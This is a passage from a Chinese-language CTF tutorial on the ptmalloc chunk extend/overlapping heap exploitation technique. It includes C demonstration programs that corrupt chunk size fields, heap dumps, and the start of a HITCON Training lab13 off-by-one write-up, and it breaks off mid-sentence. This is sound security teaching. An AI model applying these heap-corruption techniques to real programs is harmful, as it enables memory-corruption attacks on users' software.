块地址</strong>的操作如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span></span><br></pre></td></tr></table></figure><p>即使用当前块指针加上当前块大小。</p><p>在 ptmalloc 中，<strong>获取前一个 chunk 信息</strong>的操作如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span></span><br></pre></td></tr></table></figure><p>即通过 malloc_chunk-&gt;prev_size 获取前一块大小，然后使用本 chunk 地址减去所得大小。</p><p>在 ptmalloc，<strong>判断当前 chunk 是否是 use 状态</strong>的操作如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse(p)</span></span><br><span class="line">    ((((mchunkptr)(((<span class="keyword">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br></pre></td></tr></table></figure><p>即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。</p><p>更多的操作详见 <code>堆相关数据结构</code> 一节。</p><p>通过上面几个宏可以看出，<em>ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对 chunk 的前后块进行定位</em>。简而言之，<strong>chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的</strong>。</p><p>与 chunk extend 类似的还有一种称为 chunk shrink 的操作。这里只介绍 chunk extend 的利用。</p><blockquote><p><strong>以下示例代码，谨慎加入 printf 等函数，因为程序没有初始化缓冲区，如果引入这些函数的话，程序会创建一个堆用作缓存</strong></p></blockquote><h2 id="基本示例-1：对-inuse-的-fastbin-进行-extend"><a href="#基本示例-1：对-inuse-的-fastbin-进行-extend" class="headerlink" title="基本示例 1：对 inuse 的 fastbin 进行 extend"></a>基本示例 1：对 inuse 的 fastbin 进行 extend</h2><p>简单来说，该利用的效果是通过更改第一个块的大小来控制第二个块的内容。 <strong>注意，我们的示例都是在 64 位的程序。如果想在 32 位下进行测试，可以把 8 字节偏移改为 4 字节</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第一个0x10的chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x41</span>;<span class="comment">// 修改第一个块的size域</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">// 实现 extend，控制了第二个块的内容</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当两个 malloc 语句执行之后，堆的内存分布如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 2</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000020fc1 &lt;=== top chunk</span><br></pre></td></tr></table></figure><p>之后，我们把 chunk1 的 size 域更改为 0x41，0x41 是因为 chunk 的 size 域包含了用户控制的大小和 header 的大小。如上所示正好大小为 0x40。在题目中这一步可以由堆溢出得到。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000041 &lt;=== 篡改大小</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000020fc1 </span><br></pre></td></tr></table></figure><p>执行 free 之后，我们可以看到 chunk2 与 chunk1 合成一个 0x40 大小的 chunk，一起释放了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Fastbins[idx=0, size=0x10] 0x00</span><br><span class="line">Fastbins[idx=1, size=0x20] 0x00</span><br><span class="line">Fastbins[idx=2, size=0x30]  ←  Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE) </span><br><span class="line">Fastbins[idx=3, size=0x40] 0x00</span><br><span class="line">Fastbins[idx=4, size=0x50] 0x00</span><br><span class="line">Fastbins[idx=5, size=0x60] 0x00</span><br><span class="line">Fastbins[idx=6, size=0x70] 0x00</span><br></pre></td></tr></table></figure><p>之后我们通过 malloc(0x30) 得到 chunk1+chunk2 的块，此时就可以直接控制 chunk2 中的内容，我们也把这种状态称为 overlapping chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">call   <span class="number">0x400450</span> &lt;<span class="built_in">malloc</span>@plt&gt;</span><br><span class="line">mov    QWORD PTR [rbp<span class="number">-0x8</span>], rax</span><br><span class="line"></span><br><span class="line">rax = <span class="number">0x602010</span></span><br></pre></td></tr></table></figure><h3 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h3><p>因为 fastbin 追求效率，安全校验机制弱，free 时找到 fastbin 链表中对应大小链表就放入了。prev_inuse 等不会校验。物理地址相邻的空闲 fastbin 不会合并。</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-08-01-jG6JPvPb6JSupFko.png">[^1]</p><p>[^1]: fastbin 不与物理地址相邻 fastbin 合并，不与 top chunk 合并</p><h2 id="基本示例-2：对-inuse-的-smallbin-进行-extend"><a href="#基本示例-2：对-inuse-的-smallbin-进行-extend" class="headerlink" title="基本示例 2：对 inuse 的 smallbin 进行 extend"></a>基本示例 2：对 inuse 的 smallbin 进行 extend</h2><p>通过之前深入理解堆的实现部分的内容，我们得知处于 fastbin 范围的 chunk 释放后会被置入 fastbin 链表中，而不处于这个范围的 chunk 被释放后会被置于 unsorted bin 链表中。 以下这个示例中，我们使用 0x80 这个大小来分配堆（作为对比，fastbin 默认的最大的 chunk 可使用范围是 0x70）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个 0x80 的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第二个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//防止与top chunk合并的chunk3</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个 chunk，把释放的块与 top chunk 隔开。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x00000000000000b1 &lt;&#x3D;&#x3D;&#x3D;chunk1 篡改size域</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000000  0x0000000000000021 &lt;&#x3D;&#x3D;&#x3D; chunk2</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000000021 &lt;&#x3D;&#x3D;&#x3D; 防止合并的chunk</span><br><span class="line">0x6020c0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;&#x3D;&#x3D;&#x3D; top chunk</span><br></pre></td></tr></table></figure><p>释放后，chunk1 把 chunk2 的内容吞并掉并一起置入 unsorted bin ，chunk3 prev_size 写入 0xb0 ，prev_inuse 为 0 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x00000000000000b1 &lt;&#x3D;&#x3D;&#x3D; 被放入unsorted bin</span><br><span class="line">0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x00000000000000b0  0x0000000000000020 &lt;&#x3D;&#x3D;&#x3D; 注意此处标记为空</span><br><span class="line">0x6020c0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;&#x3D;&#x3D;&#x3D; top chunk</span><br><span class="line">[+] unsorted_bins[0]: fw&#x3D;0x602000, bk&#x3D;0x602000</span><br><span class="line"> →   Chunk(addr&#x3D;0x602010, size&#x3D;0xb0, flags&#x3D;PREV_INUSE)</span><br></pre></td></tr></table></figure><p>再次进行分配的时候就会取回 chunk1 和 chunk2 的空间，此时我们就可以控制 chunk2 中的内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    0x4005b0 &lt;main+74&gt;        call   0x400450 &lt;malloc@plt&gt;</span><br><span class="line">→   0x4005b5 &lt;main+79&gt;        mov    QWORD PTR [rbp-0x8], rax</span><br><span class="line"></span><br><span class="line">    rax : 0x0000000000602010</span><br></pre></td></tr></table></figure><h2 id="基本示例-3：对-free-的-smallbin-进行-extend"><a href="#基本示例-3：对-free-的-smallbin-进行-extend" class="headerlink" title="基本示例 3：对 free 的 smallbin 进行 extend"></a>基本示例 3：对 free 的 smallbin 进行 extend</h2><p>示例 3 是在示例 2 的基础上进行的，这次我们先释放 chunk1，然后再修改处于 unsorted bin 中的 chunk1 的 size 域。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个0x80的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);<span class="comment">//首先进行释放，使得chunk1进入unsorted bin</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两次 malloc 之后的结果如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000091 &lt;&#x3D;&#x3D;&#x3D; chunk 1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000000  0x0000000000000021 &lt;&#x3D;&#x3D;&#x3D; chunk 2</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000020f51</span><br></pre></td></tr></table></figure><p>我们首先释放 chunk1 使它进入 unsorted bin 中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">     unsorted_bins[0]: fw&#x3D;0x602000, bk&#x3D;0x602000</span><br><span class="line"> →   Chunk(addr&#x3D;0x602010, size&#x3D;0x90, flags&#x3D;PREV_INUSE)</span><br><span class="line"></span><br><span class="line">0x602000:   0x0000000000000000  0x0000000000000091 &lt;&#x3D;&#x3D;&#x3D; 进入unsorted bin</span><br><span class="line">0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000090  0x0000000000000020 &lt;&#x3D;&#x3D;&#x3D; chunk 2</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000020f51 &lt;&#x3D;&#x3D;&#x3D; top chunk</span><br></pre></td></tr></table></figure><p>然后篡改 chunk1 的 size 域</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x00000000000000b1 &lt;&#x3D;&#x3D;&#x3D; size域被篡改</span><br><span class="line">0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000090  0x0000000000000020</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000020f51</span><br></pre></td></tr></table></figure><p>此时再进行 malloc 分配就可以得到 chunk1+chunk2 的堆块，从而控制了 chunk2 的内容。[^2]</p><p>[^2]: 分配的安全检查机制，请看 malloc 函数介绍</p><h2 id="Chunk-Extend-Shrink-可以做什么"><a href="#Chunk-Extend-Shrink-可以做什么" class="headerlink" title="Chunk Extend/Shrink 可以做什么"></a>Chunk Extend/Shrink 可以做什么</h2><p>一般来说，这种技术并不能直接控制程序的执行流程，但是<strong>可以控制 chunk 中的内容</strong>。如果 chunk 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄漏和控制执行流程。</p><p>此外<strong>通过 extend 可以实现 chunk overlapping，通过 overlapping 可以控制 chunk 的 fd/bk 指针从而可以实现 fastbin attack 等利用</strong>。</p><h2 id="基本示例-4：通过-extend-后向-overlapping"><a href="#基本示例-4：通过-extend-后向-overlapping" class="headerlink" title="基本示例 4：通过 extend 后向 overlapping"></a>基本示例 4：通过 extend 后向 overlapping</h2><p>这里展示通过 extend 进行后向 overlapping，这也是在 CTF 中最常出现的情况，通过 overlapping 可以实现其它的一些利用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第1个 0x80 的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第2个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第3个 0x10 的chunk3</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第4个 0x10 的chunk4    </span></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x61</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化分配 4 个堆之后：</p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200801170104.png"></p><p>将第一个 chunk size 修改为 0x61 ，然后 free 第一个堆块，红框内的都会被当做一个整体放入到 fastbin 当中：</p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200801170205.png"></p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200801170307.png"></p><p>那么当再次分配大小为 0x50 （不含chunk header）时，就会调用这块内存了：</p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200801171023.png"></p><p>在 malloc(0x50) 对 extend 区域重新占位后，其中 0x10 的 fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。</p><h2 id="基本示例-5：通过-extend-前向-overlapping"><a href="#基本示例-5：通过-extend-前向-overlapping" class="headerlink" title="基本示例 5：通过 extend 前向 overlapping"></a>基本示例 5：通过 extend 前向 overlapping</h2><p>这里展示通过修改 pre_inuse 域和 pre_size 域实现合并前面（低地址）的块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin1</span></span><br><span class="line">    ptr2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin1</span></span><br><span class="line">    ptr3=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin2</span></span><br><span class="line">    ptr4=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//防止与top合并</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4<span class="number">-0x8</span>)=<span class="number">0x90</span>;<span class="comment">//修改pre_inuse域，prev_inuse</span></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4<span class="number">-0x10</span>)=<span class="number">0xd0</span>;<span class="comment">//修改pre_size域，prev_size</span></span><br><span class="line">    <span class="built_in">free</span>(ptr4);<span class="comment">//unlink进行前向extend</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x150</span>);<span class="comment">//占位块</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里例子调试一直出不来堆信息，就文字描述一下：</p><p>先布置好 5 个堆块，然后释放 ptr1 进入到 unsortedbin 。修改 ptr4 的 prev_inuse 为 0 标记前一个堆块释放（空闲）；修改 ptr4 的 prev_size 为 ptr1+ptr2+ptr3 。释放 ptr4 会触发回收机制，也就是合并物理相邻的堆，用到的操作是 unlink ，就将 ptr1~4 当做一个堆块放入 unsortedbin。</p><p><strong>前向 extend 利用了 smallbin 的 unlink 机制，通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping。</strong></p><h2 id="HITCON-Trainging-lab13"><a href="#HITCON-Trainging-lab13" class="headerlink" title="HITCON Trainging lab13"></a>HITCON Trainging lab13</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13">题目链接</a></p><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  hitcontraning_lab13 git:(master) file heapcreator</span><br><span class="line">heapcreator: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5e69111eca74cba2fb372dfcd3a59f93ca58f858, not stripped</span><br><span class="line">➜  hitcontraning_lab13 git:(master) checksec heapcreator</span><br><span class="line">[*] &#x27;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/hitcontraning_lab13/heapcreator&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>程序为 64 位动态链接程序，主要开启了 Canary 保护与 NX 保护，还有一点就是 <code>RELRO:    Partial RELRO</code> GOT 表可以修改。</p><h3 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h3><p>程序是一个堆管理器，有增删查改功能。</p><p>每个 content 堆块用一个 0x10 的结构体堆去维护，结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> size;<span class="comment">//context 大小</span></span><br><span class="line">    _QWORD *chunk;<span class="comment">//context 指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h3><p>edit 、 show 功能都存在 off-by-one ，两者出现逻辑、地方一致，造成影响的 edit ，这里就以 edit 叙述。</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-08-02-7XoD5kSKWk9XAaVb.png"></p><p>可以看到 19 行写入数据的时候传入的长度参数被故意加 1 了，造成溢出可控的一字节。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>利用 off-by-one 覆盖下一个 chunk 的 size （这里修改的是结构体 chunk ），伪造 chunk 大小</li><li>释放被溢出 chunk 后，申请伪造 chunk ，造成 chunk overlap（堆重叠），从而控制新结构体的指针。</li></ol><p>先布置好内存空间：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#1</span></span><br></pre></td></tr></table></figure><p>chunk0 content 大小要求是用到下一个 chunk 的 prev_size 用于溢出修改下一个 chunk 的 size 。</p><p>chunk1 content 大小最好是 0x10 ，这样我们溢出修改、释放 chunk1 后再申请一个 chunk 